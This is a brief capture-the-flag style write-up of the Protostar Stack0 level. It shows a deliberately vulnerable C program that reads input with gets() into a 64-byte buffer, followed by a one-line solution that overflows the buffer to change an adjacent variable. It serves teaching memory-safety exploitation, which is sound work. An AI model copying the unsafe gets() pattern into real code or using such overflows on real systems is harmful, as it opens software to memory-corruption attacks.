#### Protostar Stack0
##### About

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.  
  
This level is at /opt/protostar/bin/stack0  

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

The value of the parameter "int modified" can be changed by overflowing char buffer[64].  
  
Because gets() is an unsafe function.

##### Solution
```
$ python -c "print 'A'*65" | ./stack0
```

##### Reference
<https://github.com/Wins0n/Exploit-Exercises_ProtoStar/blob/master/protostar_part1.md>
